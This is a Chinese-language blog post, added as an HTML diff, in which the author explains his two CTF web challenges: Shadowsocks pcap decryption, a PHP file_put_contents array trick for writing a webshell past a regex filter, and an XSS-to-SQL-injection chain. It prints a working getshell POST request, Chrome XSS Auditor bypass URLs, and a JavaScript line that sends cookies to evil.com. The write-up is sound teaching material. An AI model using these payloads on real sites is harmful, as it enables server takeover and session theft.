@@ -1,0 +1,750 @@
+
+
+<html class="no-js">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
+    <title>Pwnhub 第一次线下沙龙竞赛Web题解析 | 离别歌</title>
+    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
+    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
+    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
+    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
+    
+<style>div.row .col-xs-4 {
+  float: left;
+  margin-left: 4px;
+}
+div.row .col-xs-4 img {
+  margin-left: 5px;
+}
+</style>
+<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
+<link rel="stylesheet" href="../static/deep/css/code.css">
+
+</head>
+<body>
+<!--[if lt IE 8]>
+    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
+<![endif]-->
+<div id="header">
+    <div class="container">
+        <h1 class="h1-title">
+            <a href="../index.html">
+               <img src="../static/deep/images/logo.png" alt="离别歌" />
+            </a>
+        </h1>
+        <div id="nav">
+        <input type="checkbox" id="button">
+        <label for="button" onclick>菜单</label>
+        
+        <ul>
+            
+            <li class="item ">
+                <a href="../index.html" >首页</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../list/index.html" >文章</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/tinger.html" >关于</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/friends-link.html" >友链</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://github.com/phith0n" target="_blank" >项目</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
+            </li>
+            
+        </ul>
+        
+        </div>
+    </div>
+</div>
+
+<div class="banner-bar">
+    <div class="container">
+        <div class="col-12 columns">
+            <div class="place">
+                <a href="../index.html">首页</a>
+                &raquo;
+                
+                网络安全 &raquo; <a href="pwnhub-first-shalon-ctf-web-writeup.html">Pwnhub 第一次线下沙龙竞赛Web题解析</a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="container">
+    <div class="col-11 columns" id="mainbody" role="main">
+        <div class="post-single type-post">
+            <h1 class="article-h1">Pwnhub 第一次线下沙龙竞赛Web题解析</h1>
+            <div class="details-up">
+  <span class="author">作者: phithon</span>
+  
+  <span class="category">分类: <a href="../sort/PENETRATION.html">网络安全</a></span>
+  
+  <span class="date">时间: 2017-8-13 21:58</span>
+  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">8条评论</a></span>
+  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="pwnhub-first-shalon-ctf-web-writeup.html">31065人看过</a></span>
+  
+  <span class="date">标签:
+    
+        <a href="../tag/pwnhub.html">pwnhub</a>
+    
+        <a href="../tag/ctf.html">ctf</a>
+    
+  </span>
+  
+</div>
+            <div class="entry">
+                <p>Pwnhub在8月12日举办了第一次线下沙龙，我也出了两道Web相关的题目，其中涉及好几个知识点，这里说一下。</p>
+<h2 id="_1"><a class="toclink" href="#_1">题目《国家保卫者》</a></h2>
+<p>国家保卫者是一道MISC题目，题干：</p>
+<blockquote>
+<p>Phith0n作为一个国家保卫者，最近发现国际网络中有一些奇怪的数据包，他取了一个最简单的（神秘代码 123456 ），希望能分析出有趣的东西来。<br />
+<a href="https://pwnhub.cn/attachments/170812_okKJICF5RDsF/package.pcapng">https://pwnhub.cn/attachments/170812_okKJICF5RDsF/package.pcapng</a></p>
+</blockquote>
+<h3 id="_2"><a class="toclink" href="#_2">考点一、数据包分析</a></h3>
+<p>其实题干很简单，就是给了个数据包，下载以后用Wireshark打开即可。因为考虑到线下沙龙时间较短，所以我只抓了一个TCP连接，避免一些干扰。</p>
+<p>因为我没明确写这个数据包是干嘛的，有的同学做题的时候有点不知所以然。其实最简单的一个方法，打开数据包，如果Wireshark没有明确说这是什么协议的时候，就直接看看目标端口：</p>
+<p><a href="../media/attachment/2017/08/13/cd21ab5a-ec99-4300-b9b6-28d056cd121e.jpg"><img alt="15026240660069.jpg" src="../media/attachment/2017/08/13/cd21ab5a-ec99-4300-b9b6-28d056cd121e.a859b07f00d1.jpg" /></a></p>
+<p>8388端口，搜一下就知道默认是什么服务了。</p>
+<p>Shadowsocks数据包解密，这个点其实我2015年已经想出了，但一直我自己没仔细研究过他的源码，对其加密的整个流程也不熟悉。后面抽空阅读了一些源码，发现其数据流有一个特点，就是如果传输的数据太大的话，还是会对数据包进行分割。</p>
+<p>所以，我之前直接把源码打包后用shadowsocks传一遍，发现抓下来的包是需要处理才能解密，不太方便，后来就干脆弄了个302跳转，然后把目标地址和源码的文件名放在数据包里。</p>
+<p>找到返回包的Data，然后右键导出：</p>
+<p><a href="../media/attachment/2017/08/13/f0146f8c-a02c-4f6d-a871-c474fd3ab8ba.jpg"><img alt="15026249267455.jpg" src="../media/attachment/2017/08/13/f0146f8c-a02c-4f6d-a871-c474fd3ab8ba.5a3dad46fb47.jpg" /></a></p>
+<p>然后下载Shadowsocks的源码，其中有一个encrypt.py，虽然整个加密和流量打包的过程比较复杂，但我们只需要调用其中解密的方法即可。</p>
+<p>源码我就不分析了，解密代码如下（<code>./data.bin</code>是导出的密文，<code>123456</code>是题干里给出的“神秘代码”，<code>aes-256-cfb</code>是默认加密方式）：</p>
+<div class="codehilite"><pre><span></span><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./data.bin&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">Encryptor</span><span class="p">(</span><span class="s1">&#39;123456&#39;</span><span class="p">,</span> <span class="s1">&#39;aes-256-cfb&#39;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+</pre></div>
+
+
+<p>直接把这个代码加到encrypt.py下面，然后执行即可：</p>
+<p><a href="../media/attachment/2017/08/13/d16c03ca-a01c-49d8-8c2d-96e540f441fc.jpg"><img alt="15026264308957.jpg" src="../media/attachment/2017/08/13/d16c03ca-a01c-49d8-8c2d-96e540f441fc.a08b2f9e25f3.jpg" /></a></p>
+<p>当然，在实战中，进行密钥的爆破、加密方法的爆破，这个也是有可能的。为了不给题目增加难度，我就设置的比较简单。</p>
+<h3 id="phptrick"><a class="toclink" href="#phptrick">考点二、PHP代码审计/Trick</a></h3>
+<p>解密出数据包后可以看到，Location的值给出了两个信息：</p>
+<ol>
+<li>源码包的路径</li>
+<li>目标地址</li>
+</ol>
+<p>所以，下载源码进行分析。</p>
+<p>这是一个比较简单的代码审计题目，简单流程就是，用户创建一个Ticket，然后后端会将Ticket的内容保存到以“cache/用户名/Ticket标题.php”命名的文件中。然后，用户可以查看某个Ticket，根据Ticket的名字，将“cache/用户名/Ticket标题.php”内容读取出来。</p>
+<p>这个题目的考点就在于，写入文件之前，我对用户输出的内容进行了一次正则检查：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">is_valid</span><span class="p">(</span><span class="nv">$title</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$title</span> <span class="o">.</span> <span class="nv">$data</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;|\A[ _a-zA-Z0-9]+\z|is&#39;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">write_cache</span><span class="p">(</span><span class="nv">$title</span><span class="p">,</span> <span class="nv">$content</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$dir</span> <span class="o">=</span> <span class="nx">changedir</span><span class="p">(</span><span class="nx">CACHE_DIR</span> <span class="o">.</span> <span class="nx">get_username</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span> <span class="nv">$dir</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_valid</span><span class="p">(</span><span class="nv">$title</span><span class="p">,</span> <span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">exit</span><span class="p">(</span><span class="s2">&quot;title or content error&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">{</span><span class="nv">$dir</span><span class="si">}{</span><span class="nv">$title</span><span class="si">}</span><span class="s2">.php&quot;</span><span class="p">;</span>
+
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+    <span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>整个流程如下：</p>
+<ol>
+<li>title和content拼接成字符串</li>
+<li>将1的结果进行正则检测拦截，正则比较严格，<code>\A[ _a-zA-Z0-9]+\z</code>，只允许数字、字母、下划线和空格</li>
+<li>匹配成功，使用<code>file_put_contents(title, content)</code>写入文件中</li>
+</ol>
+<p>也就是说，我们的webshell，至少需要<code>&lt;?</code>等字符，但实际上这里正则把特殊符号都拦截了。</p>
+<p>这就考到PHP的一个小Trick了，我们看看<code>file_put_contents</code>的文档即可发现：</p>
+<p><a href="../media/attachment/2017/08/13/6a11235b-054f-4e48-b8e5-38a698c86fb3.jpg"><img alt="15026275380628.jpg" src="../media/attachment/2017/08/13/6a11235b-054f-4e48-b8e5-38a698c86fb3.21d299357b75.jpg" /></a></p>
+<p>其第二个参数允许传入一个数组，如果是数组的话，将被连接成字符串再进行写入。</p>
+<p>回看我的题目，在正则匹配前，<code>$title</code>和<code>$content</code>进行了字符串连接。得益于PHP的弱类型特性，数组会被强制转换成字符串，也就是<code>Array</code>，Array肯定是满足正则<code>\A[ _a-zA-Z0-9]+\z</code>的，所以不会被拦截。</p>
+<p>所以最后，发送如下数据包即可成功getshell：</p>
+<div class="codehilite"><pre><span></span><span class="err">POST /i.php HTTP/1.1 </span>
+<span class="err">Host: 52.80.37.67:8078 </span>
+<span class="err">Content-Length: 49 </span>
+<span class="err">Cache-Control: max-age=0 </span>
+<span class="err">Origin: http://52.80.37.67:8078 </span>
+<span class="err">Upgrade-Insecure-Requests: 1 </span>
+<span class="err">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 </span>
+<span class="err">Content-Type: application/x-www-form-urlencoded </span>
+<span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 </span>
+<span class="err">Referer: http://52.80.37.67:8078/index.php </span>
+<span class="err">Accept-Language: zh-CN,zh;q=0.8,en;q=0.6 </span>
+<span class="err">Cookie: PHPSESSID=asdsa067hpqelof5cevlgcsip4 </span>
+<span class="err">Connection: close </span>
+
+<span class="err">title=s&amp;content[]=&lt;?php&amp;content[]=%0aphpinfo();</span>
+</pre></div>
+
+
+<p>（自豪的说一下，为了防搅屎，我已经把我前段时间写的PHP沙盒加进来了，所以getshell后只能执行少量函数。最后只要执行一下<code>show_flag()</code>即可获得Flag）</p>
+<p><code>file_put_contents</code>这个特性还是比较有实战意义的，比如像下面这种基于文件内容的WAF，就可以绕过：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$text</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">];</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;[&lt;&gt;?]&#39;</span><span class="p">,</span> <span class="nv">$text</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;error!&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">&#39;config.php&#39;</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span>
+</pre></div>
+
+
+<h2 id="_3"><a class="toclink" href="#_3">题目《改行做前端》</a></h2>
+<p>这个题目看似是一个前端安全的题目，实际上还考了另一个比较隐蔽的点。</p>
+<p>题干：</p>
+<blockquote>
+<p>Phithon最近考虑改行做前端，这是他写的第一个页面： <a href="http://54.222.168.105:8065/">http://54.222.168.105:8065/</a><br />
+（所有测试在Chrome 60 + 默认配置下进行）</p>
+</blockquote>
+<h3 id="xss"><a class="toclink" href="#xss">考点一、XSS综合利用</a></h3>
+<p>这个考点是一个比较普通的点，没什么太多障碍。打开页面，发现下方有一个提交框，直接点提交，即可发现返回如下链接：<code>http://54.222.168.105:8065/?error=验证码错误</code></p>
+<p>error这个参数被写在JavaScript的引号里，并对引号进行了转义：</p>
+<div class="codehilite"><pre><span></span><span class="nt">&lt;script&gt;</span>
+    window.onload = function () {
+        var error = &#39;aaa\&#39;xxx&#39;;
+        $(&quot;#error&quot;).text(error).show();
+    };
+<span class="nt">&lt;/script&gt;</span>
+</pre></div>
+
+
+<p>但fuzz一下0-255的所有字符，发现其有如下特征：</p>
+<ol>
+<li>没有转义<code>&lt;</code>、<code>&gt;</code></li>
+<li>换行被替换成<code>&lt;br /&gt;</code></li>
+</ol>
+<p>没有转义<code>&lt;</code>、<code>&gt;</code>，我们就可以传入<code>error=&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>来进行跨站攻击。但问题是，Chrome默认有XSS过滤器，我们需要绕过。</p>
+<p>这里其实就是借用了前几天 @长短短 在Twitter上发过的一个绕过Chrome Auditor的技巧：</p>
+<p><a href="../media/attachment/2017/08/13/6ec58772-81e8-4bc0-8bca-8b52b6099c10.jpg"><img alt="15026285720946.jpg" src="../media/attachment/2017/08/13/6ec58772-81e8-4bc0-8bca-8b52b6099c10.0fe9b9961cce.jpg" /></a></p>
+<p>换行被转换成<code>&lt;br /&gt;</code>后，用上述Payload即可执行任意代码。</p>
+<p>另外，还有个方法：<a href="../HTML/chrome-xss-auditor-bypass-collection.html#script_1">《浏览器安全一 / Chrome XSS Auditor bypass》 - 输出在script内字符串位置的情况</a> ，这里提到的这个POC也能利用：<a href="http://54.222.168.105:8065/?error=%3C/script%3E%3Csvg%3E%3Cscript%3E%7Balert(1)%2b%26apos%3B">http://54.222.168.105:8065/?error=%3C/script%3E%3Csvg%3E%3Cscript%3E{alert(1)%2b%26apos%3B</a> （和我博客中文章给的POC有一点不同，因为要闭合后面的<code>}</code>，所以前面需要加个<code>{</code>）</p>
+<p>最后，构造如下Payload：</p>
+<div class="codehilite"><pre><span></span>http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF%3C/script%3E%3Cscript%3E1%3C(br=1)*/%0deval(atob(location.hash.substr(1)))%3C/script%3E#xxxxxx
+</pre></div>
+
+
+<p>将我们需要执行的代码base64编码后放在xxxxxx的位置即可。</p>
+<h3 id="_4"><a class="toclink" href="#_4">漏洞利用</a></h3>
+<p>发现了一个XSS，前台正好有一个可以提交URL的地方，所以，将构造好的Payload提交上去即可。</p>
+<p>猜测一下后台的行为：管理员查看了用户提交的内容，如果后台本身没有XSS的情况下，管理员点击了我们提交的URL，也能成功利用。</p>
+<p>但因为前台有一个unsafe-inline csp，不能直接加载外部的资源，所以我用链接点击的方式，将敏感信息传出：</p>
+<div class="codehilite"><pre><span></span><span class="nt">a</span><span class="o">=</span><span class="nt">document</span><span class="p">.</span><span class="nc">createElement</span><span class="o">(</span><span class="s1">&#39;a&#39;</span><span class="o">);</span><span class="nt">a</span><span class="p">.</span><span class="nc">href</span><span class="o">=</span><span class="s1">&#39;http://evil.com/?&#39;</span><span class="o">+</span><span class="nt">encodeURI</span><span class="o">(</span><span class="nt">document</span><span class="p">.</span><span class="nc">referrer</span><span class="o">+</span><span class="s1">&#39;;&#39;</span><span class="o">+</span><span class="nt">document</span><span class="p">.</span><span class="nc">cookie</span><span class="o">);</span><span class="nt">a</span><span class="p">.</span><span class="nc">click</span><span class="o">();</span>
+</pre></div>
+
+
+<p>另外，因为后台还有一定的过滤，所以尽量把他们用url编码一遍。</p>
+<p>打到了后台地址和Cookie：</p>
+<p><a href="../media/attachment/2017/08/13/18e409c9-33e7-427f-839f-d9c4ff971e96.jpg"><img alt="15026307052985.jpg" src="../media/attachment/2017/08/13/18e409c9-33e7-427f-839f-d9c4ff971e96.3f9653658c14.jpg" /></a></p>
+<p>用该Cookie登录一下：</p>
+<p><a href="../media/attachment/2017/08/13/786945ea-2aff-4446-a598-0e6a4868729f.jpg"><img alt="15026311183702.jpg" src="../media/attachment/2017/08/13/786945ea-2aff-4446-a598-0e6a4868729f.7f028bd75a60.jpg" /></a></p>
+<p>没有Flag……gg，</p>
+<h3 id="sql"><a class="toclink" href="#sql">考点二、SQL注入</a></h3>
+<p>这题看似仅仅是一个XSS题目，但是我们发现进入后台并没有Flag，这是怎么回事？</p>
+<p>回去翻翻数据包，仔细看看，发现我们之前一直忽略了一个东西：</p>
+<p><a href="../media/attachment/2017/08/13/ef48396e-dbde-45b1-a9b0-9cf3bc2759cb.jpg"><img alt="15026316936410.jpg" src="../media/attachment/2017/08/13/ef48396e-dbde-45b1-a9b0-9cf3bc2759cb.97db0b548e76.jpg" /></a></p>
+<p>report-uri是CSP中的一个功能，当CSP规则被触发时，将会向report-uri指向的地址发送一个数据包。其设计目的是让开发者知道有哪些页面可能违反CSP，然后去改进他。</p>
+<p>比如，我们访问如下URL：<code>http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF%3C/script%3E%3Cscript%3E1%3C(br=1)*/%0deval(location.hash.substr(1))%3C/script%3E#$.getScript('http://mhz.pw')</code>，这里加载外部script，违反了CSP，所以浏览器发出了一个请求：</p>
+<p><a href="../media/attachment/2017/08/13/3587b59b-3eb4-475e-af55-2f77cb3bd3f5.jpg"><img alt="15026320400585.jpg" src="../media/attachment/2017/08/13/3587b59b-3eb4-475e-af55-2f77cb3bd3f5.48f8566ba087.jpg" /></a></p>
+<p>这个数据包如下：</p>
+<div class="codehilite"><pre><span></span><span class="nf">POST</span> <span class="nn">/report</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">54.222.168.105:8065</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">843</span>
+<span class="na">Origin</span><span class="o">:</span> <span class="l">http://54.222.168.105:8065</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/csp-report</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF%3C/script%3E%3Cscript%3E1%3C(br=1)*/%0deval(location.hash.substr(1))%3C/script%3E</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,en;q=0.6</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=i1q84v0up0fol18vemfo7aeuk1</span>
+
+{&quot;csp-report&quot;:{&quot;document-uri&quot;:&quot;http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF%3C/script%3E%3Cscript%3E1%3C(br=1)*/%0deval(location.hash.substr(1))%3C/script%3E&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;violated-directive&quot;:&quot;script-src&quot;,&quot;effective-directive&quot;:&quot;script-src&quot;,&quot;original-policy&quot;:&quot;default-src &#39;self&#39; https://*.cloudflare.com https://*.googleapis.com https://*.gstatic.com; script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; https://*.cloudflare.com https://*.googleapis.com https://*.gstatic.com; style-src &#39;self&#39; &#39;unsafe-inline&#39; https://*.cloudflare.com https://*.googleapis.com https://*.gstatic.com; report-uri /report&quot;,&quot;disposition&quot;:&quot;enforce&quot;,&quot;blocked-uri&quot;:&quot;http://mhz.pw/?_=1502631925558&quot;,&quot;line-number&quot;:4,&quot;column-number&quot;:27989,&quot;source-file&quot;:&quot;https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js&quot;,&quot;status-code&quot;:200,&quot;script-sample&quot;:&quot;&quot;}}
+</pre></div>
+
+
+<p>这个请求其实是有注入的，注入点在<code>document-uri</code>、<code>blocked-uri</code>、<code>violated-directive</code>这三个位置都有，随便挑一个：</p>
+<p><a href="../media/attachment/2017/08/13/0e002b9b-df9e-4200-a15c-68961f2238fa.jpg"><img alt="15026323862641.jpg" src="../media/attachment/2017/08/13/0e002b9b-df9e-4200-a15c-68961f2238fa.d1a76cfe1caa.jpg" /></a></p>
+<p>普通注入，我就不多说了。</p>
+<p>注入获得两个账号，其中<code>caibiph</code>的密码可以解密，直接用这个账号登录后台，即可查看到Flag：</p>
+<p><a href="../media/attachment/2017/08/13/a25802f1-c292-4b01-a817-345e11ef22fb.jpg"><img alt="15026324963084.jpg" src="../media/attachment/2017/08/13/a25802f1-c292-4b01-a817-345e11ef22fb.922acb3c9278.jpg" /></a></p>
+            </div>
+            <div itemprop="keywords" class="tags-meta">
+                标签:
+                
+                    <a href="../tag/pwnhub.html">pwnhub</a>
+                
+                    <a href="../tag/ctf.html">ctf</a>
+                
+            </div>
+            <br>
+<!--MOB SHARE BEGIN-->
+<div class="-mob-share-ui-button -mob-share-open">分享</div>
+<div class="-mob-share-ui" style="display: none">
+    <ul class="-mob-share-list">
+        <li class="-mob-share-weibo"><p>新浪微博</p></li>
+        <li class="-mob-share-qzone"><p>QQ空间</p></li>
+        <li class="-mob-share-qq"><p>QQ好友</p></li>
+        <li class="-mob-share-weixin"><p>微信</p></li>
+        <li class="-mob-share-douban"><p>豆瓣</p></li>
+        <li class="-mob-share-facebook"><p>Facebook</p></li>
+        <li class="-mob-share-twitter"><p>Twitter</p></li>
+        <li class="-mob-share-pocket"><p>Pocket</p></li>
+        <li class="-mob-share-google"><p>Google+</p></li>
+        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
+        <li class="-mob-share-mingdao"><p>明道</p></li>
+        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
+        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
+        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
+    </ul>
+    <div class="-mob-share-close">取消</div>
+</div>
+<div class="-mob-share-ui-bg"></div>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
+<!--MOB SHARE END-->
+
+        <div class="qqlist">
+          <h3>订阅本站<small>(RSS)</small></h3>
+          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
+          <input type="hidden" value="qf_booked_feedback" name="t" />
+          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
+          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
+          <button type="submit" >订阅&rarr;</button>
+          </form>
+        </div>
+
+
+        </div>
+
+        
+        <div class="post-single type-post text-center">
+            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
+            <img src="../static/wx.jpg" width="280" alt="">
+        </div>
+        
+
+        <!-- 评论位置 -->
+        <div id="comments" class="comments">
+          <h3>已有 8 条评论</h3>
+            <ol class="comment-list">
+            
+            
+              <li class="comment-body" id="comment-2898">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">Monburan</a></div>
+                    <p>厉害厉害</p>
+                    <span class="comment-time">时间: 2017-08-22 16:44</span>
+                    <span class="comment-reply"><a href="#comment-2898" onclick="reply_to('2898','Monburan')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2893">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">菜鸟</a></div>
+                    <p>这才是真正的黑客啊，研究的东西又深又透彻，思路又猥琐</p>
+                    <span class="comment-time">时间: 2017-08-18 10:54</span>
+                    <span class="comment-reply"><a href="#comment-2893" onclick="reply_to('2893','菜鸟')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2891">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/f3085d21f285a7c2fbf472f6908be6e6.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">开发者头条</a></div>
+                    <p>感谢分享！已推荐到《开发者头条》：https://toutiao.io/posts/gs01vb 欢迎点赞支持！<br>欢迎订阅《fdr的闲聊铺》https://toutiao.io/subjects/80898</p>
+                    <span class="comment-time">时间: 2017-08-15 09:02</span>
+                    <span class="comment-reply"><a href="#comment-2891" onclick="reply_to('2891','开发者头条')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2895">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">水水水水</a></div>
+                    <p>@开发者头条  。。。。。。</p>
+                    <span class="comment-time">时间: 2017-08-21 18:14</span>
+                    <span class="comment-reply"><a href="#comment-2895" onclick="reply_to('2895','水水水水')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2896">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">水水水水</a></div>
+                    <p>@水水水水 0.。。。</p>
+                    <span class="comment-time">时间: 2017-08-21 18:14</span>
+                    <span class="comment-reply"><a href="#comment-2896" onclick="reply_to('2896','水水水水')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2897">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">水水水水</a></div>
+                    <p>@水水水水 啊啊撒阿斯顿</p>
+                    <span class="comment-time">时间: 2017-08-21 19:30</span>
+                    <span class="comment-reply"><a href="#comment-2897" onclick="reply_to('2897','水水水水')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2889">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">水泡泡</a></div>
+                    <p>一如既往的精品，php手册都被p神读烂了~</p>
+                    <span class="comment-time">时间: 2017-08-14 13:18</span>
+                    <span class="comment-reply"><a href="#comment-2889" onclick="reply_to('2889','水泡泡')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2887">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/9e6f5398f679192e9b6628f6c3eb71c2.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.lsafe.org" target="_blank" rel="nofollow noopener">离心</a></div>
+                    <p>学到了，file_put_conntents还能用数组玩。</p>
+                    <span class="comment-time">时间: 2017-08-14 09:09</span>
+                    <span class="comment-reply"><a href="#comment-2887" onclick="reply_to('2887','离心')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+            
+            </ol>
+            
+        </div>
+
+        <div id="reply"></div>
+        <div id="comment-place">
+            <div id="comment-post" class="respond none-resize">
+             <div id="respond">
+                <h3 id="response">添加新评论</h3>
